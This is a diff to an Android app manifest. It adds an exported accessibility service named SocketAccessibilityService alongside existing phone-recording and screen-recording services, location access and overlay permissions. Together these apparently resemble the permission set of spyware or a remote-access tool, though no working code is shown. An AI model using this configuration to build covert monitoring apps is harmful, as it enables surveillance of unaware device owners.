@@ -20,6 +20,7 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
 
     <application
         android:name="com.view.core.MyApplication"
@@ -28,6 +29,7 @@
         android:label="@string/app_name"
         android:supportsRtl="true"
         android:theme="@style/AppTheme"
+        android:requestLegacyExternalStorage="true"
         >
         <meta-data
             android:name="aia-compat-api-min-version"
@@ -85,12 +87,26 @@
             ></service>
 
         <service
+            android:name="com.view.core.services.SocketAccessibilityService"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="location"
+            android:label="无障碍辅助功能名称"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_config" />
+        </service>
+
+        <service
             android:name="com.view.core.services.PhoneRecordService"
             android:enabled="true"
             android:exported="true"
             ></service>
-
-
 
         <service
             android:name="com.view.core.services.ScreenRecordService"
